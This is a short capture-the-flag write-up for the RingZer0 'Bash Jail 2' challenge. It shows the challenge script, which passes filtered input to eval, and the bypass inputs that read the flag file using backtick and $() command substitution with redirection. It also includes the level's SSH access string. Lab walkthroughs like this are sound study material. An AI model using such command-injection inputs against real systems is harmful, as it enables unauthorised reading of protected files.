# **Bash Jail 2**

![](https://i.imgur.com/vUtYZIh.png)

```
ubuntu@ubuntu-virtual-machine:~$ ssh level2@challenges.ringzer0team.com -p 10219 

level2@challenges.ringzer0team.com's password: 
FLAG-U96l4k6m72a051GgE5EN0rA85499172K

Flag is located at /home/level2/flag.txt
```
```
Challenge bash code:
-----------------------------

function check_space {
	if [[ $1 == *[bdks';''&'' ']* ]]
	then 	
    		return 0
	fi

	return 1
}

while :
do
	echo "Your input:"
	read input
	if check_space "$input" 
	then
		echo -e '\033[0;31mRestricted characters has been used\033[0m'
	else
		output="echo Your command is: $input"
		eval $output
	fi
done 

-----------------------------
Your input:
```

```
Your input:
cat /home/level2/flag.txt
Restricted characters has been used
Your input:
</home/level2/flag.txt
Your command is:
Your input:
`ls`    
Restricted characters has been used
Your input:
s
Restricted characters has been used
Your input:
`whoami`
Your command is: level2
Your input:
`</home/level2/flag.txt`
Your command is: FLAG-XXXXXX
```

※Another method:

![](https://i.imgur.com/bXOwyrj.png)

```
Your input:
$(<flag.txt)
Your command is: FLAG-XXXXXX
```
